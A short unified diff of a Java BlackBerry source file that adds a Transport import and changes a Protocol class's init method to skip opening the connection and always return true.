@@ -9,6 +9,7 @@ import javax.microedition.io.file.FileSystemRegistry;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
+import blackberry.action.sync.transport.Transport;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -42,7 +43,8 @@ public abstract class Protocol {
 
     public boolean init(Transport transport) {
         this.transport = transport;
-        return transport.initConnection();
+        //transport.initConnection();
+        return true;
     }
 
     public abstract boolean perform() throws ProtocolException;
